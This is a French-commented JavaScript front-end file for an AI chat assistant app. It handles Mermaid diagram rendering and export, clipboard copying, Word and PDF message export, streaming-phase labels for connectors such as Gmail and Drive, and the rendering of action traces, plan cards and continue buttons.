        if (host.dataset && host.dataset.mermaidDone) continue;
        const src = (code.textContent || '').trim();
        if (!src) continue;
        if (host.dataset) host.dataset.mermaidDone = '1';
        const id = 'mmd-' + (++__mermaidSeq);
        try {
            const { svg } = await mermaid.render(id, src);
            const fig = document.createElement('div');
            fig.className = 'mermaid-diagram';
            fig.innerHTML = '<div class="mermaid-svg">' + svg + '</div>' + mermaidToolbarHtml();
            host.replaceWith(fig);
        } catch (err) {
            document.getElementById(id)?.remove();
            if (!host.nextElementSibling || !host.nextElementSibling.classList.contains('mermaid-error')) {
                const note = document.createElement('div');
                note.className = 'mermaid-error';
                note.textContent = t('Schéma non rendu (syntaxe Mermaid invalide).');
                host.insertAdjacentElement('afterend', note);
            }
        }
    }
}

function mermaidIntrinsicSize(svg) {
    const vb = svg.viewBox && svg.viewBox.baseVal;
    let w = vb && vb.width ? vb.width : 0;
    let h = vb && vb.height ? vb.height : 0;
    if (!w || !h) {
        const r = svg.getBoundingClientRect();
        w = r.width || 800;
        h = r.height || 600;
    }
    return { w, h };
}

function mermaidExportBackground(fig) {
    // Fond du conteneur (suit le thème dark/light) : embarqué dans les exports
    // pour qu'un schéma sombre reste lisible hors de l'app (viewer blanc).
    const bg = fig ? getComputedStyle(fig).backgroundColor : '';
    return bg && bg !== 'transparent' && !/rgba\(.*,\s*0\)/.test(bg) ? bg : '#ffffff';
}

function serializeMermaidSvg(svg, size, background) {
    const clone = svg.cloneNode(true);
    if (size && size.w && size.h) {
        clone.setAttribute('width', String(size.w));
        clone.setAttribute('height', String(size.h));
    }
    clone.style.maxWidth = 'none';
    clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
    if (background) {
        const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
        rect.setAttribute('x', '-5%');
        rect.setAttribute('y', '-5%');
        rect.setAttribute('width', '110%');
        rect.setAttribute('height', '110%');
        rect.setAttribute('fill', background);
        clone.insertBefore(rect, clone.firstChild);
    }
    return new XMLSerializer().serializeToString(clone);
}

function triggerBlobDownload(blob, filename) {
    // App mobile : a.download est inopérant en WKWebView → feuille de partage
    // native (native-bridge.js). No-op hors app.
    if (window.NativeBridge?.saveAndShare) {
        window.NativeBridge.saveAndShare(blob, filename);
        return;
    }
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
    // Délai large : révoquer trop tôt interrompt l'enregistrement d'un gros
    // fichier sur certains navigateurs.
    setTimeout(() => URL.revokeObjectURL(url), 8000);
}

function downloadMermaidSvg(fig) {
    const svg = fig.querySelector('svg');
    if (!svg) return;
    const xml = serializeMermaidSvg(svg, mermaidIntrinsicSize(svg), mermaidExportBackground(fig));
    const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?>\n' + xml], { type: 'image/svg+xml;charset=utf-8' });
    triggerBlobDownload(blob, 'schema.svg');
}

function downloadMermaidPng(fig) {
    const svg = fig.querySelector('svg');
    if (!svg) return;
    const size = mermaidIntrinsicSize(svg);
    const background = mermaidExportBackground(fig);
    const xml = serializeMermaidSvg(svg, size, background);
    const url = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(xml);
    const img = new Image();
    img.onload = () => {
        const scale = 2;
        const canvas = document.createElement('canvas');
        canvas.width = Math.max(1, Math.round(size.w * scale));
        canvas.height = Math.max(1, Math.round(size.h * scale));
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = background;
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((b) => { if (b) triggerBlobDownload(b, 'schema.png'); }, 'image/png');
    };
    img.onerror = () => alert(t('Échec de la conversion PNG du schéma.'));
    img.src = url;
}

document.getElementById('chatMessages')?.addEventListener('click', (e) => {
    const pngBtn = e.target.closest('.btn-mermaid-png');
    const svgBtn = e.target.closest('.btn-mermaid-svg');
    if (!pngBtn && !svgBtn) return;
    const fig = (pngBtn || svgBtn).closest('.mermaid-diagram');
    if (!fig) return;
    if (pngBtn) downloadMermaidPng(fig);
    else downloadMermaidSvg(fig);
});

/**
 * Neutralise fonds et couleurs d'un fragment destiné au presse-papiers, et
 * retire ce qui n'est pas du contenu (en-têtes de blocs de code, barre
 * d'actions, trace des actions). SOURCE UNIQUE partagée par le bouton
 * « Copier » et par la copie native (sélection + Ctrl+C) : deux règles
 * divergentes donneraient deux collages différents pour le même texte.
 *
 * Le texte est forcé en noir : collé dans Word ou Gmail, le blanc du thème
 * sombre serait invisible.
 */
/**
 * Une copie ou un export n'embarque JAMAIS une ressource d'un autre site :
 * collée dans un logiciel de messagerie ou rendue par l'export PDF (côté
 * serveur), elle serait chargée sans que personne l'ait décidé. Image externe,
 * affichée ou non (bouton « Afficher » compris) → lien vers son adresse.
 */
function externalImagesToLinks(wrapper) {
    wrapper.querySelectorAll('.ext-img, img').forEach(el => {
        const placeholder = el.classList.contains('ext-img');
        const src = placeholder ? (el.dataset.src || '') : (el.getAttribute('src') || '');
        if (!placeholder && isSameOriginResource(src)) return;
        if (!src) { el.remove(); return; }
        const link = document.createElement('a');
        link.href = src;
        link.append(document.createTextNode(((placeholder ? el.dataset.alt : el.getAttribute('alt')) || '').trim() || src));
        el.replaceWith(link);
    });
}

function neutralizeClipboardStyles(wrapper) {
    // Cartes de fichier et boutons d'image : remplacés par leur contenu
    // (nom du fichier + aperçu) avant tout le reste — generated-files.js.
    window.MiaFiles?.flattenForExport(wrapper);
    // Cartes de choix : la question et la liste des options (choice-buttons.js).
    window.MiaChoices?.flattenForExport(wrapper);
    externalImagesToLinks(wrapper);

    wrapper.querySelectorAll('.btn-copy-code, .code-block-header, .msg-actions, .msg-trace, .msg-error-actions, .msg-error-contacts')
        .forEach(el => el.remove());

    wrapper.style.color = '#000000';
    wrapper.style.background = 'transparent';
    wrapper.style.backgroundColor = 'transparent';

    wrapper.querySelectorAll('*').forEach(el => {
        if (!(el instanceof HTMLElement)) return;
        el.style.background = 'transparent';
        el.style.backgroundColor = 'transparent';
        if (el.tagName !== 'A') {
            el.style.color = 'inherit';
        }
    });

    return wrapper;
}

function buildAssistantClipboardPayload(copyBtn) {
    const msgBody = copyBtn?.closest('.msg-body');
    const contentEl = msgBody?.querySelector('.msg-content');
    const mdEl = contentEl?.querySelector('.md-render');
    const raw = contentEl?.dataset?.raw || '';
    // Blocs de choix : la question et la liste des options, pas la syntaxe.
    const plainText = (raw ? (window.MiaChoices ? window.MiaChoices.toPlainText(raw) : raw) : (mdEl?.textContent || '')).trim();

    if (!mdEl) {
        return { html: '', plainText };
    }

    const wrapper = document.createElement('div');
    wrapper.appendChild(mdEl.cloneNode(true));
    neutralizeClipboardStyles(wrapper);

    return { html: wrapper.outerHTML, plainText };
}

/**
 * Copie NATIVE (sélection à la souris + Ctrl+C) dans le fil de conversation.
 *
 * Le navigateur sérialise alors les styles CALCULÉS des ancêtres de la
 * sélection dans le flavor `text/html` — dont le `background-color` de la page
 * (`--bg`, gris clair en thème clair). Le texte collé arrivait donc sur un
 * fond gris dans Word, Gmail ou Docs, sans qu'aucun fond ne soit posé sur la
 * bulle elle-même : rien à corriger en CSS, c'est le presse-papiers qu'il faut
 * réécrire.
 *
 * On reconstruit donc le fragment nous-mêmes : markup sémantique conservé
 * (titres, listes, tableaux, gras, liens), fonds et couleurs neutralisés —
 * exactement ce que produit le bouton « Copier ».
 */
function cloneSelectionForClipboard(range) {
    let inner = document.createElement('div');
    inner.appendChild(range.cloneContents());

    let ancestor = range.commonAncestorContainer;
    if (ancestor && ancestor.nodeType !== Node.ELEMENT_NODE) ancestor = ancestor.parentElement;

    // `cloneContents()` s'arrête au plus petit ancêtre commun : un <li> collé
    // sans son <ul>, ou un <td> sans sa <table>, perdrait sa mise en forme.
    // On ré-enveloppe donc dans des clones VIDES des ancêtres, jusqu'au corps
    // du message.
    for (let el = ancestor; el && el !== document.body; el = el.parentElement) {
        if (el.classList?.contains('msg-content')) break;
        const shell = el.cloneNode(false);
        while (inner.firstChild) shell.appendChild(inner.firstChild);
        inner.appendChild(shell);
    }

    return neutralizeClipboardStyles(inner);
}

document.addEventListener('copy', (e) => {
    const container = document.getElementById('chatMessages');
    if (!container || !e.clipboardData) return;

    const sel = window.getSelection();
    if (!sel || sel.isCollapsed || sel.rangeCount === 0) return;

    const range = sel.getRangeAt(0);
    if (!container.contains(range.startContainer) || !container.contains(range.endContainer)) return;

    const plainText = sel.toString();
    if (!plainText.trim()) return;

    let html = '';
    try {
        html = cloneSelectionForClipboard(range).innerHTML;
    } catch (_err) {
        return; // en cas de pépin, on laisse le navigateur faire sa copie habituelle
    }
    if (!html) return;

    e.clipboardData.setData('text/html', `<div style="background:transparent;color:#000000">${html}</div>`);
    e.clipboardData.setData('text/plain', plainText);
    e.preventDefault();
});

async function copyAssistantMessage(copyBtn) {
    const msgBody = copyBtn?.closest('.msg-body');
    const contentEl = msgBody?.querySelector('.msg-content');
    const rawText = contentEl?.dataset?.raw || '';

    // Cas message image-only (outil "Imagine") : on copie l'image elle-même.
    if (isImageOnlyText(rawText) && navigator.clipboard?.write && typeof ClipboardItem !== 'undefined') {
        const url = extractImageUrlFromText(rawText);
        if (url) {
            try {
                const blob = await fetchImageAsPngBlob(url);
                if (blob) {
                    await navigator.clipboard.write([
                        new ClipboardItem({ [blob.type]: blob }),
                    ]);
                    return true;
                }
            } catch (err) {
                /* fallback texte ci-dessous */
            }
        }
    }

    const payload = buildAssistantClipboardPayload(copyBtn);
    if (!payload.html && !payload.plainText) return false;

    if (payload.html && navigator.clipboard?.write && typeof ClipboardItem !== 'undefined') {
        const item = new ClipboardItem({
            'text/html': new Blob([payload.html], { type: 'text/html' }),
            'text/plain': new Blob([payload.plainText || ''], { type: 'text/plain' }),
        });
        await navigator.clipboard.write([item]);
        return true;
    }

    if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(payload.plainText || '');
        return true;
    }

    return false;
}

/**
 * Récupère une image depuis une URL et la renvoie en Blob PNG (la plupart des
 * navigateurs n'acceptent que `image/png` côté ClipboardItem). Re-encode via
 * canvas si le format source diffère.
 */
async function fetchImageAsPngBlob(url) {
    const res = await fetch(url, { mode: 'cors' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const srcBlob = await res.blob();
    if (srcBlob.type === 'image/png') return srcBlob;

    return await new Promise((resolve, reject) => {
        const img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = () => {
            const canvas = document.createElement('canvas');
            canvas.width  = img.naturalWidth;
            canvas.height = img.naturalHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0);
            canvas.toBlob(b => b ? resolve(b) : reject(new Error('toBlob a échoué')), 'image/png');
        };
        img.onerror = () => reject(new Error(t('Chargement image impossible')));
        img.src = URL.createObjectURL(srcBlob);
    });
}

/** Télécharge l'image d'un message image-only sur l'ordinateur. */
async function saveAssistantImage(saveBtn) {
    const msgBody = saveBtn?.closest('.msg-body');
    const contentEl = msgBody?.querySelector('.msg-content');
    const rawText = contentEl?.dataset?.raw || '';
    const url = extractImageUrlFromText(rawText);
    if (!url) {
        showToast(t('Image introuvable.'), 'error');
        return;
    }
    const originalLabel = saveBtn.innerHTML;
    saveBtn.disabled = true;
    try {
        // Même téléchargement que le bouton posé sur l'image
        // (generated-files.js) : un seul chemin, nom de fichier identique,
        // et la même issue quand l'image refuse d'être lue par le script.
        if (window.MiaFiles) {
            const saved = await window.MiaFiles.downloadImage(url);
            if (!saved) { saveBtn.innerHTML = originalLabel; saveBtn.disabled = false; return; }
        } else {
            const res = await fetch(url, { mode: 'cors' });
            if (!res.ok) throw new Error('HTTP ' + res.status);
            const blob = await res.blob();
            const ext = (blob.type.split('/')[1] || 'png').split('+')[0];
            downloadBlobAsFile(blob, 'image-' + Date.now() + '.' + ext);
        }
        saveBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Téléchargé`;
        setTimeout(() => { saveBtn.innerHTML = originalLabel; saveBtn.disabled = false; }, 2000);
    } catch (err) {
        showToast(t('Téléchargement impossible.'), 'error');
        saveBtn.innerHTML = originalLabel;
        saveBtn.disabled = false;
    }
}

function resolveMessageIdFromActionButton(btn) {
    const messageEl = btn?.closest('.message');
    if (!messageEl) return '';
    const byMessage = String(messageEl.dataset.messageId || '').trim();
    if (byMessage) return byMessage;
    const byContent = String(messageEl.querySelector('.msg-content')?.dataset?.messageId || '').trim();
    return byContent;
}

function parseFilenameFromContentDisposition(headerValue) {
    if (!headerValue) return '';
    const utf8Match = headerValue.match(/filename\*=UTF-8''([^;]+)/i);
    if (utf8Match?.[1]) {
        try { return decodeURIComponent(utf8Match[1]); } catch (_err) { return utf8Match[1]; }
    }
    const simpleMatch = headerValue.match(/filename=\"?([^\";]+)\"?/i);
    return simpleMatch?.[1] || '';
}

// Un seul chemin d'enregistrement : triggerBlobDownload, qui passe par la
// feuille de partage dans l'application mobile (a.download y est inopérant).
function downloadBlobAsFile(blob, filename) {
    triggerBlobDownload(blob, filename || 'export.pdf');
}

async function exportAssistantMessageDocx(exportBtn) {
    const messageId = resolveMessageIdFromActionButton(exportBtn);
    if (!messageId) {
        showToast(t('Export Word impossible: identifiant message introuvable.'), 'error');
        return;
    }

    const originalHtml = exportBtn.innerHTML;
    exportBtn.disabled = true;
    exportBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg>Export...`;

    try {
        const payload = buildAssistantClipboardPayload(exportBtn);
        let htmlForDocx = payload.html || '';
        if (!htmlForDocx && payload.plainText) {
            const fallbackText = escHtml(payload.plainText).replace(/\n/g, '<br>');
            htmlForDocx = `<div>${fallbackText}</div>`;
        }
        if (!htmlForDocx) {
            // Cas pages HTML générées : on récupère le HTML complet côté serveur.
            try {
                const richRes = await fetchWithSessionGuard(`/chat/message/${encodeURIComponent(messageId)}/html`, {
                    headers: { 'X-CSRF-Token': csrfToken, 'Accept': 'application/json' },
                });
                if (richRes.ok) {
                    const richData = await richRes.json().catch(() => ({}));
                    if (typeof richData?.html === 'string' && richData.html.trim()) {
                        htmlForDocx = richData.html;
                    }
                }
            } catch (err) {
                if (err instanceof Error && err.message === 'SESSION_EXPIRED') throw err;
            }
        }

        const res = await fetchWithSessionGuard(`/chat/message/${encodeURIComponent(messageId)}/docx`, {
            method: 'POST',
            headers: {
                'X-CSRF-Token': csrfToken,
                'Content-Type': 'application/json',
                'Accept': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            },
            body: JSON.stringify({ html: htmlForDocx }),
        });

        if (!res.ok) {
            const data = await res.json().catch(() => ({}));
            throw new Error(data.error || `HTTP ${res.status}`);
        }

        const blob = await res.blob();
        const filename = parseFilenameFromContentDisposition(res.headers.get('Content-Disposition'))
            || `message-${messageId}.docx`;
        downloadBlobAsFile(blob, filename);
    } catch (err) {
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
        showToast(t('Export Word impossible.'), 'error');
    } finally {
        exportBtn.disabled = false;
        exportBtn.innerHTML = originalHtml;
    }
}

async function exportAssistantMessagePdf(exportBtn) {
    const messageId = resolveMessageIdFromActionButton(exportBtn);
    if (!messageId) {
        showToast(t('Export PDF impossible: identifiant message introuvable.'), 'error');
        return;
    }

    const originalHtml = exportBtn.innerHTML;
    exportBtn.disabled = true;
    exportBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg>Export...`;

    try {
        const payload = buildAssistantClipboardPayload(exportBtn);
        let htmlForPdf = payload.html || '';
        if (!htmlForPdf && payload.plainText) {
            const fallbackText = escHtml(payload.plainText).replace(/\n/g, '<br>');
            htmlForPdf = `<div style="color:#000;background:transparent;background-color:transparent">${fallbackText}</div>`;
        }
        if (!htmlForPdf) {
            try {
                const richRes = await fetchWithSessionGuard(`/chat/message/${encodeURIComponent(messageId)}/html`, {
                    headers: {
                        'X-CSRF-Token': csrfToken,
                        'Accept': 'application/json',
                    },
                });
                if (richRes.ok) {
                    const richData = await richRes.json().catch(() => ({}));
                    if (typeof richData?.html === 'string' && richData.html.trim()) {
                        htmlForPdf = richData.html;
                    }
                }
            } catch (err) {
                if (err instanceof Error && err.message === 'SESSION_EXPIRED') throw err;
            }
        }

        const res = await fetchWithSessionGuard(`/chat/message/${encodeURIComponent(messageId)}/pdf`, {
            method: 'POST',
            headers: {
                'X-CSRF-Token': csrfToken,
                'Content-Type': 'application/json',
                'Accept': 'application/pdf',
            },
            body: JSON.stringify({ html: htmlForPdf }),
        });

        if (!res.ok) {
            const data = await res.json().catch(() => ({}));
            throw new Error(data.error || `HTTP ${res.status}`);
        }

        const blob = await res.blob();
        const filename = parseFilenameFromContentDisposition(res.headers.get('Content-Disposition'))
            || `message-${messageId}.pdf`;
        downloadBlobAsFile(blob, filename);
    } catch (err) {
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
        showToast(t('Export PDF impossible.'), 'error');
    } finally {
        exportBtn.disabled = false;
        exportBtn.innerHTML = originalHtml;
    }
}

const STREAM_PHASE_LABELS = {
    analyzing:                 t('Analyse de votre demande…'),
    searching_knowledge_base:  t('Recherche dans mes documents de référence…'),
    searching_knowledge_bases: t('Recherche dans les bases de connaissances…'),
    mybrain_dig:               t('Nouvelle recherche dans le cerveau MyBrain…'),
    mybrain_read:              t('Lecture d’une fiche MyBrain…'),
    mybrain_feed:              t('Préparation de l’apport au cerveau MyBrain…'),
    schedule_prepare:          t('Préparation de la tâche programmée…'),
    assistant_prepare:         t('Préparation de l’assistant…'),
    workflow_prepare:          t('Préparation du workflow…'),
    generating_avatar:         t('Création de l’avatar de l’assistant…'),
    web_search:                t('Recherche complémentaire sur Internet…'),
    generating:                t('En réflexion…'),
    generating_image:          t('Génération de l\'image…'),
    drive_search:              t('Recherche dans votre Google Drive…'),
    drive_read:                t('Lecture du document Google Drive…'),
    drive_list:                t('Contenu du dossier Google Drive…'),
    gmail_search:              t('Recherche dans vos emails Gmail…'),
    gmail_read:                t('Lecture de l\'email…'),
    gmail_attachment:          t('Lecture de la pièce jointe…'),
    outlook_search:            t('Recherche dans vos emails Outlook…'),
    outlook_read:              t('Lecture de l\'email Outlook…'),
    outlook_attachment:        t('Lecture de la pièce jointe Outlook…'),
    calendar_search:           t('Consultation de votre agenda…'),
    calendar_read:             t('Lecture de l\'évènement…'),
    calendar_slots:            t('Recherche de créneaux libres…'),
    mscalendar_search:         t('Consultation de votre agenda Outlook…'),
    mscalendar_read:           t('Lecture de l\'évènement Outlook…'),
    mscalendar_slots:          t('Recherche de créneaux libres dans Outlook…'),
    web_read:                  t('Lecture de la page web…'),
    conversation_search:       t('Recherche dans vos anciennes conversations…'),
    // Fenêtre de contexte : longue conversation résumée, fichier ancien relu,
    // résultat d'outil démesuré condensé (ContextWindow, ResultCondenser).
    summarizing:               t('Résumé du début de la conversation…'),
    conversation_file:         t('Relecture d’un fichier de la conversation…'),
    condensing:                t('Synthèse d’un résultat volumineux…'),
    emails_search:             t('Recherche dans vos emails Gmail et Outlook…'),
    agendas_search:            t('Consultation de vos agendas Google et Outlook…'),
    everywhere_search:         t('Recherche dans toutes vos sources…'),
    tasks_read:                t('Consultation de vos tâches Google…'),
    mstodo_read:               t('Consultation de vos tâches Microsoft To Do…'),
    slack_search:              t('Recherche dans vos conversations Slack…'),
    slack_read:                t('Lecture de la conversation Slack…'),
    teams_search:              t('Recherche dans vos conversations Teams…'),
    teams_read:                t('Lecture de la conversation Teams…'),
    n8n_list:                t('Recherche de l\u2019automatisation n8n…'),
    n8n_run:                   t('Exécution de l\u2019automatisation n8n…'),
    gamma_generate:            t('Préparation de la présentation Gamma…'),
    drive_write:               t('Écriture dans votre Google Drive…'),
    // Rangement : phase distincte de drive_write — à ce stade MIA ne fait que
    // résoudre le fichier et le dossier pour la carte d'approbation, rien
    // n'est encore écrit.
    drive_organize:            t('Préparation d’un rangement Google Drive…'),
    drive_format:              t('Préparation de la mise en forme du document…'),
    drive_copy:                t('Préparation de la copie du fichier…'),
    sheets_format:             t('Préparation de la mise en forme de la feuille…'),
    memorizing:                t('Mise à jour de votre mémoire…'),
};

/**
 * Pile des actions effectuées par MIA avant de répondre (recherches KB /
 * Internet, lectures de connecteurs, écritures en attente…). Rendue en tête de
 * .msg-body — HORS .msg-content : re-rendu à chaque delta markdown, jamais
 * dans data-raw donc jamais dans Copier ni les exports PDF/Word.
 * Entrées {t, l, d?, ok} fabriquées par le serveur (libellé `l` inclus —
 * source unique ChatController::ACTION_LABELS, aucune table côté client).
 * Au-delà de ACTION_TRACE_VISIBLE lignes, le reste se replie sous un bouton
 * « +N autres actions » (délégation de clic plus bas).
 * NOTE SYNCHRONISATION : templates/partials/message.php rend la même
 * structure côté serveur (chargement de page) — toute évolution ici doit y
 * être répercutée.
 */
const ACTION_TRACE_VISIBLE = 5;

function renderActionTrace(bodyEl, actions, running = []) {
    if (!bodyEl || !Array.isArray(actions)) return;
    running = Array.isArray(running) ? running : [];
    let trace = bodyEl.querySelector(':scope > .msg-trace');
    if (actions.length === 0 && running.length === 0) {
        trace?.remove();
        return;
    }
    if (!trace) {
        trace = document.createElement('div');
        trace.className = 'msg-trace';
        // Sous la carte du plan quand elle existe (plan, puis ce qui a été fait).
        const plan = bodyEl.querySelector(':scope > .msg-plan');
        bodyEl.insertBefore(trace, plan ? plan.nextSibling : bodyEl.firstChild);
    }
    const expanded = trace.classList.contains('expanded');
    const rows = actions.map((a, i) => {
        const failed = a && a.ok === false;
        const hidden = !expanded && i >= ACTION_TRACE_VISIBLE ? ' hidden' : '';
        const detail = a && a.d ? `<span class="msg-trace-detail">${escHtml(String(a.d))}</span>` : '';
        // `i` = famille visuelle (mail, agenda, tâche, fichier…) résolue par le
        // serveur (ChatController::ACTION_ICONS) et posée aussi bien sur le flux
        // live que sur l'historique relu en base ; le glyphe vient de main.css.
        // Repli 'check' = comportement d'origine pour une entrée sans famille.
        const icon = failed ? 'warn' : String((a && a.i) || 'check');
        return `<div class="msg-trace-row${failed ? ' is-failed' : ''}"${hidden}>`
            + `<span class="msg-trace-icon" data-icon="${escHtml(icon)}" aria-hidden="true"></span>`
            + `<span class="msg-trace-label">${escHtml(String((a && a.l) || ''))}</span>${detail}</div>`;
    });
    const more = !expanded && actions.length > ACTION_TRACE_VISIBLE
        ? `<button type="button" class="msg-trace-more">+${actions.length - ACTION_TRACE_VISIBLE} autre${actions.length - ACTION_TRACE_VISIBLE > 1 ? 's' : ''} action${actions.length - ACTION_TRACE_VISIBLE > 1 ? 's' : ''}</button>`
        : '';
    // Appels EN COURS : toujours visibles (hors repli), en bas de la pile.
    const live = running.map(a => {
        const detail = a && a.d ? `<span class="msg-trace-detail">${escHtml(String(a.d))}</span>` : '';
        return `<div class="msg-trace-row is-running">`
            + `<span class="msg-trace-icon" data-icon="running" aria-hidden="true"></span>`
            + `<span class="msg-trace-label">${escHtml(String((a && a.l) || ''))}</span>${detail}</div>`;
    });
    trace.innerHTML = rows.join('') + more + live.join('');
}

/**
 * Carte « Plan de travail » (outil plan_de_travail) : en tête de la réponse,
 * remplacée à chaque mise à jour. NOTE SYNCHRONISATION : même structure que
 * templates/partials/message.php (rendu au chargement de la page).
 * plan = {etapes: [{titre, statut}], commentaire?}
 */
const PLAN_STATUS_LABELS = {
    a_faire: () => t('À faire'),
    en_cours: () => t('En cours'),
    fait: () => t('Fait'),
    abandonne: () => t('Abandonnée'),
};
function renderPlanCard(bodyEl, plan) {
    if (!bodyEl || !plan || !Array.isArray(plan.etapes) || plan.etapes.length === 0) return;
    let card = bodyEl.querySelector(':scope > .msg-plan');
    if (!card) {
        card = document.createElement('div');
        card.className = 'msg-plan';
        bodyEl.insertBefore(card, bodyEl.firstChild);
    }
    const done = plan.etapes.filter(s => s && s.statut === 'fait').length;
    const steps = plan.etapes.map(s => {
        const statut = PLAN_STATUS_LABELS[s && s.statut] ? s.statut : 'a_faire';
        return `<li class="msg-plan-step" data-status="${escHtml(statut)}">`
            + `<span class="msg-plan-mark" aria-hidden="true"></span>`
            + `<span class="msg-plan-title">${escHtml(String((s && s.titre) || ''))}</span>`
            + `<span class="msg-plan-status">${escHtml(PLAN_STATUS_LABELS[statut]())}</span></li>`;
    }).join('');
    const note = plan.commentaire ? `<div class="msg-plan-note">${escHtml(String(plan.commentaire))}</div>` : '';
    // « Refaire en workflow » : même rendu que templates/partials/message.php.
    // L'adresse est lue au clic (la réponse n'a son identifiant qu'une fois enregistrée).
    const toWorkflow = window.WORKFLOWS_USABLE && plan.etapes.length >= 2
        ? `<a class="msg-plan-workflow" href="/workflows/new" title="${escAttr(t('Faire de ce plan un workflow réutilisable'))}">`
            + `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${window.WORKFLOW_ICON || ''}</svg>`
            + `${escHtml(t('Refaire en workflow'))}</a>`
        : '';
    card.innerHTML = `<div class="msg-plan-head"><span class="msg-plan-icon" aria-hidden="true"></span>`
        + `<span>${escHtml(t('Plan de travail'))}</span>`
        + `<span class="msg-plan-count">${done}/${plan.etapes.length}</span>${toWorkflow}</div>`
        + `<ol class="msg-plan-steps">${steps}</ol>${note}`;
}

/** Note d'avancement du modèle (vide = retirée). Sous la pile d'actions. */
function renderProgressNote(bodyEl, note) {
    if (!bodyEl) return;
    let el = bodyEl.querySelector(':scope > .msg-progress');
    if (!note) { el?.remove(); return; }
    if (!el) {
        el = document.createElement('div');
        el.className = 'msg-progress';
        const trace = bodyEl.querySelector(':scope > .msg-trace');
        const plan = bodyEl.querySelector(':scope > .msg-plan');
        const after = trace || plan;
        bodyEl.insertBefore(el, after ? after.nextSibling : bodyEl.firstChild);
    }
    el.textContent = String(note);
}

/**
 * Bouton « Continuer » : sous la DERNIÈRE réponse quand elle peut être
 * poursuivie (plan inachevé, budget d'allers-retours atteint — data-suite
 * posé par le serveur) et qu'aucune carte n'y attend plus de décision. Un
 * clic envoie « Continue. » comme un message ordinaire : le serveur rappelle
 * au modèle le plan resté inachevé et l'issue des cartes.
 */
function syncContinueButton() {
    const wrap = document.getElementById('chatMessages');
    if (!wrap) return;
    // Mêmes moments (fin d'une réponse, décision sur une carte, changement de
    // conversation, chargement) : les choix proposés suivent.
    syncChoicePrompts();
    wrap.querySelectorAll('.msg-continue').forEach(el => el.remove());
    // La suggestion de suite aussi — même quand aucun bouton « Continuer »
    // n'est posé (le retour anticipé plus bas), d'où l'appel différé.
    queueMicrotask(syncComposerSuggestion);
    const messages = wrap.querySelectorAll(':scope > .message');
    const last = messages[messages.length - 1];
    // La dernière réponse du modèle, suivie au plus de messages d'issue (✅…)
    // et de cartes seules : ceux-là ne portent pas de data-suite.
    let target = null;
    for (let i = messages.length - 1; i >= 0; i--) {
        const m = messages[i];
        if (m.classList.contains('message-user')) break;
        if (m.dataset.suite) { target = m; break; }
    }
    const live = activeStreams.get(String(convId() || ''));
    if (!target || !last || (live && !live.done)) return;
    if (pendingBatchCards().length > 0 || document.querySelector('#chatMessages .mail-draft-card:not(.is-done):not(.is-cancelled):not(.is-failed) .drive-confirm-actions')) return;
    // Même coque qu'une réponse (avatar réservé) : alignée sur le fil.
    const row = document.createElement('div');
    row.className = 'message message-assistant msg-continue';
    row.innerHTML = '<div class="msg-avatar assistant-avatar drive-batch-spacer" aria-hidden="true"></div><div class="msg-body"></div>';
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'btn-secondary msg-continue-btn';
    btn.textContent = target.dataset.suite === 'budget' ? t('Continuer (étapes restantes)') : t('Continuer');
    btn.addEventListener('click', () => {
        row.remove();
        msgInput.value = t('Continue.');
        submitForm();
    });
    row.querySelector('.msg-body').appendChild(btn);
    last.insertAdjacentElement('afterend', row);
}

/**
 * Suggestion de suite (FollowUpSuggestion) : la prochaine demande probable,
 * proposée en grisé dans la zone de saisie sous la DERNIÈRE réponse du modèle,
 * reprise d'un appui sur Tab (composer-hints.js affiche et reprend).
 *
 * Rien n'est proposé tant que la réponse s'écrit, qu'une génération tourne
 * dans la conversation, qu'une carte attend une décision, que des choix en
 * boutons sont ouverts ou que le bouton « Continuer » est posé (ce sont déjà
 * des suites), ni sous une erreur. Une suggestion déjà calculée est relue sur
 * le message (data-suggestion, '' = aucune suite) ; sinon elle est demandée
 * UNE fois par page — le serveur la garde avec la réponse, refuse les
 * réponses anciennes et ne facture qu'un appel par réponse.
 */
const composerSuggestionAsked = new Set();

function composerSuggestionTarget() {
    const wrap = document.getElementById('chatMessages');
    const cid = String(convId() || '');
    if (!wrap || !cid) return null;
    const messages = wrap.querySelectorAll(':scope > .message');
    const last = messages[messages.length - 1];
    // Une carte en fin de fil ou le bouton « Continuer » sont des .message
    // sans identifiant : la suite est déjà là.
    if (!last || !last.classList.contains('message-assistant') || !last.dataset.messageId) return null;
    if (last.classList.contains('msg-continue') || last.dataset.suite) return null;
    if (last.querySelector('.msg-content.streaming, .msg-error, .choice-card[data-state="live"]')) return null;
    const live = activeStreams.get(cid);
